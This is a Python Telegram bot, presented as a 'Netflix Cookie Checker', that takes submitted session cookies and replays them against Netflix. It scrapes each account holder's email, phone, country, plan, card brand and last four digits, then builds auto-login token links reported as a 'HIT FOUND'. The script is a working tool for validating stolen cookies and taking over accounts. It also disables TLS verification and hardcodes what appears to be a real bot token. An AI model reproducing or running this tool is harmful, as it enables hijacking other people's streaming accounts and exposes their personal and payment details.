import re
import json
import random
import time
import os
import urllib3
import urllib.parse
from datetime import datetime
import requests

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes
)

# Disable insecure request warnings for proxy verification
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
# Replace with your actual bot token, or set it via environment variables
BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"

UA_WEB = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)
UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"

COUNTRY_FLAGS = {
    "US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹",
    "TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦",
    "AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰",
    "FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴",
    "PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩",
    "MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪",
    "NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿",
    "UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼",
    "HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇪🇨","UY":"🇺🇾",
    "NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬",
}

COUNTRY_NAMES = {
    "US":"United States","GB":"United Kingdom","DE":"Germany","FR":"France",
    "ES":"Spain","IT":"Italy","TR":"Turkey","BR":"Brazil","JP":"Japan",
    "KR":"South Korea","IN":"India","CA":"Canada","AU":"Australia","MX":"Mexico",
    "NL":"Netherlands","SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland",
    "PL":"Poland","RU":"Russia","AR":"Argentina","CL":"Chile","CO":"Colombia",
    "PE":"Peru","AE":"UAE","SA":"Saudi Arabia","EG":"Egypt","ZA":"South Africa",
    "ID":"Indonesia","MY":"Malaysia","SG":"Singapore","TH":"Thailand","VN":"Vietnam",
    "PH":"Philippines","KE":"Kenya","NG":"Nigeria","GH":"Ghana","PT":"Portugal",
    "RO":"Romania","HU":"Hungary","CZ":"Czech Republic","UA":"Ukraine",
    "AT":"Austria","CH":"Switzerland","BE":"Belgium","IL":"Israel","TW":"Taiwan",
    "HK":"Hong Kong","PK":"Pakistan","NZ":"New Zealand","SK":"Slovakia",
    "HR":"Croatia","RS":"Serbia","BG":"Bulgaria",
}

def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def _rx_all(pattern, text):
    return re.findall(pattern, text, re.S)

def _flag(cc):
    return COUNTRY_FLAGS.get((cc or "").upper(), "🌍")

def _country(cc):
    return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")

def parse_netscape(text):
    cookies = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    return cookies

def parse_json_cookies(text):
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}

def load_cookies(text):
    text = text.strip()
    if text.startswith("[") or text.startswith("{"):
        c = parse_json_cookies(text)
        if c: return c
    c = parse_netscape(text)
    if c: return c
    cookies = {}
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k = k.strip()
            v = v.strip()
            if k: cookies[k] = v
    return cookies

def generate_nftoken(netflix_id_raw, timeout=15):
    if not netflix_id_raw:
        return None
    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    
    _IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    _IOS_PARAMS = {
        "appVersion": "15.48.1",
        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true","useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}',
        "device_type": "NFAPPL-02-",
        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false", "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375", "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true", "path": '["account","token","default"]', "pathFormat": "graph", "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
    }
    _IOS_HEADERS = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1", "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE", "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE", "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}', "x-netflix.context.app-version": "15.48.1", "x-netflix.argo.translated": "true", "x-netflix.context.form-factor": "phone", "x-netflix.context.sdk-version": "2012.4", "x-netflix.client.appversion": "15.48.1", "x-netflix.context.max-device-width": "375", "x-netflix.context.ab-tests": "", "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053", "x-netflix.client.type": "argo", "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200", "x-netflix.context.locales": "en-US", "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3", "x-netflix.client.iosversion": "15.8.5", "accept-language": "en-US;q=1", "x-netflix.argo.abtests": "", "x-netflix.context.os-version": "15.8.5", "x-netflix.request.client.context": '{"appState":"foreground"}', "x-netflix.context.ui-flavor": "argo", "x-netflix.argo.nfnsm": "9", "x-netflix.context.pixel-density": "2.0", "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3", "x-netflix.request.client.timezoneid": "Asia/Dhaka",
    }

    headers = dict(_IOS_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=timeout, verify=False)
        if r.status_code == 200:
            tok = r.json().get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
            if tok: return str(tok)
    except Exception: pass

    try:
        sess2 = requests.Session()
        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}},
        }
        r2 = sess2.post(
            "https://android13.prod.ftl.netflix.com/graphql",
            json=payload,
            headers={"User-Agent": UA_ANDROID, "Accept": "application/json", "Content-Type": "application/json"},
            timeout=timeout
        )
        if r2.status_code == 200:
            tok = r2.json().get("data", {}).get("createAutoLoginToken")
            if tok: return str(tok)
    except Exception: pass
    return None

def check_account(cookies: dict, timeout=20):
    if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
        return None

    sess = requests.Session()
    sess.headers.update({
        "User-Agent": UA_WEB,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "DNT": "1",
    })
    for k, v in cookies.items():
        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")

    try:
        r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
    except requests.RequestException:
        return None

    if "login" in r.url.lower() or r.status_code in (401, 403):
        return None

    html = r.text
    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
        return None

    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html)) or _djs(_rx(r'"firstName":"([^"]+)"', html))
    cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")

    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
    if not since:
        ts_raw = _rx(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
        if ts_raw.isdigit():
            try: since = datetime.utcfromtimestamp(int(ts_raw) / 1000).strftime("%B %Y")
            except Exception: since = "N/A"

    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
    quality_map = {"UHD": "UHD 4K", "FHD": "FHD 1080p", "HD": "HD 720p", "SD": "SD 480p"}
    quality = quality_map.get(q_raw, q_raw or "N/A")
    streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))

    _pm_start = html.find('"paymentMethods"')
    pm_raw = html[_pm_start:_pm_start + 3000] if _pm_start >= 0 else ""
    card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw) or _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    pay_type   = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw) or _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)

    phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
    pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
    phone_verified = pv_raw == "true"
    extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")

    free_trial = '"isInFreeTrial":true' in html
    profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)] or [_djs(p) for p in _rx_all(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
    profiles_clean = list(dict.fromkeys([p for p in profiles if p]))

    netflix_id_raw = cookies.get("NetflixId", "")
    tok = generate_nftoken(netflix_id_raw, timeout=timeout) if netflix_id_raw else None
    if tok:
        tok_safe    = urllib.parse.quote(tok, safe="")
        login_pc    = f"https://netflix.com/?nftoken={tok_safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
    else:
        login_pc = login_phone = "N/A"

    return {
        "email": email or "N/A", "name": name or (profiles_clean[0] if profiles_clean else "N/A"),
        "country_code": cc, "country": _country(cc), "plan": plan or "N/A", "price": price or "N/A",
        "member_since": since or "N/A", "next_billing": nextbill or "N/A", "free_trial": free_trial,
        "video_quality": quality, "max_streams": str(streams), "extra_slots": int(extra_raw) if extra_raw.isdigit() else 0,
        "card_brand": card_brand or "N/A", "card_last4": card_last4 or "N/A", "payment_method": pay_type or "N/A",
        "phone": phone, "phone_verified": phone_verified, "profiles": profiles_clean, "profile_count": len(profiles_clean),
        "netflix_id_raw": netflix_id_raw, "login_pc": login_pc, "login_phone": login_phone, "login_tv": "https://www.netflix.com/tv2"
    }

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 <b>Welcome to Netflix Cookie Checker Bot!</b>\n\n"
        "Send me your cookie string as a text message, or upload a <code>.txt</code> file containing your cookies.",
        parse_mode="HTML"
    )

async def handle_cookie_processing(update: Update, cookie_text: str):
    # Temporary status message
    status_msg = await update.message.reply_text("⚡ <i>Checking cookies against Netflix services...</i>", parse_mode="HTML")
    
    cookies = load_cookies(cookie_text)
    if not cookies:
        await status_msg.edit_text("❌ <b>Could not parse any valid cookies out of your text!</b>", parse_mode="HTML")
        return

    result = check_account(cookies)
    if not result:
        await status_msg.edit_text("❌ <b>BAD / Expired / Invalid Cookie.</b>", parse_mode="HTML")
        return

    # Delete processing status and frame up hit report
    await status_msg.delete()

    flag  = _flag(result["country_code"])
    profs = ", ".join(result["profiles"][:4]) if result["profiles"] else "N/A"
    pv    = "✅" if result["phone_verified"] else "❌"
    cookie_val = f"NetflixId={result['netflix_id_raw']}" if result['netflix_id_raw'] else "See submitted structure"

    caption = (
        f"🎬 <b>NETFLIX HIT FOUND!</b>\n\n"
        f"👤 <b>{result['name']}</b>\n"
        f"📧 <code>{result['email']}</code>\n"
        f"🌍 {result['country']} {flag} ({result['country_code']})\n\n"
        f"📋 <b>{result['plan']}</b>  •  💰 {result['price']}\n"
        f"📅 Since: {result['member_since']}\n"
        f"🗓 Billing: {result['next_billing']}\n"
        f"🎁 Free Trial: {'Yes' if result['free_trial'] else 'No'}\n\n"
        f"🎥 {result['video_quality']}  |  📺 {result['max_streams']} streams  |  ➕ {result['extra_slots']} extra\n"
        f"💳 {result['card_brand']} *{result['card_last4']}  •  {result['payment_method']}\n"
        f"📞 {result['phone']}  {pv}\n"
        f"👥 Profiles ({result['profile_count']}): {profs}\n\n"
        f"🍪 <b>Cookie</b>\n"
        f"<code>{cookie_val}</code>"
    )

    buttons = []
    row1 = []
    if result.get("login_pc") and result["login_pc"] != "N/A":
        row1.append(InlineKeyboardButton("🖥 Click to PC", url=result["login_pc"]))
    if result.get("login_phone") and result["login_phone"] != "N/A":
        row1.append(InlineKeyboardButton("📱 Click to Phone", url=result["login_phone"]))
    if row1:
        buttons.append(row1)
    buttons.append([InlineKeyboardButton("📺 Click to TV", url=result["login_tv"])])

    await update.message.reply_text(
        text=caption,
        reply_markup=InlineKeyboardMarkup(buttons),
        parse_mode="HTML"
    )

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_cookie_processing(update, update.message.text)

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.lower().endswith(('.txt', '.json')):
        await update.message.reply_text("⚠️ Please send your cookies in a valid <code>.txt</code> or <code>.json</code> document.", parse_mode="HTML")
        return
        
    file_obj = await context.bot.get_file(doc.file_id)
    file_bytes = await file_obj.download_as_bytearray()
    
    try:
        cookie_text = file_bytes.decode('utf-8', errors='ignore')
        await handle_cookie_processing(update, cookie_text)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to decode file contents: {str(e)}")

def main():
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN":
        print("[!] Please provide a valid Telegram token inside the script.")
        return

    print("[*] Launching Asynchronous Telegram Client...")
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))

    print("[+] Bot is pooling active updates. Send a text/document via Telegram to parse.")
    app.run_polling()

if __name__ == "__main__":
    main()
